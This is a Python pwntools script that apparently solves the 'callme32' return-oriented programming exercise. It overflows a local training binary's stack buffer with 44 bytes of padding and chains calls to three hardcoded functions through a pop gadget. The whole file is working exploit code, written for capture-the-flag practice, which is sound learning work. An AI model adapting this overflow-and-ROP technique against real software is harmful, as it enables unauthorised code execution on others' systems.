import sys; sys.path.append("../..")
import shared_pwn
from pwn import *

BINARY_NAME = "callme32"

io = process(f"./{BINARY_NAME}")

junk = b"\x90" * 44

callme_one      = p32(0x080485c0)
callme_two      = p32(0x08048620)
callme_three    = p32(0x080485b0)

pop_gadget      = p32(0x080488a9)

def call_function(function):

    payload = b""
    payload += function
    payload += pop_gadget
    payload += p32(1)
    payload += p32(2)
    payload += p32(3)
    return payload


payload = b""
payload += junk
payload += call_function(callme_one)
payload += call_function(callme_two)
payload += call_function(callme_three)

io.recvuntil("> ")
io.send(payload)
io.send("\n")
shared_pwn._recvall(io)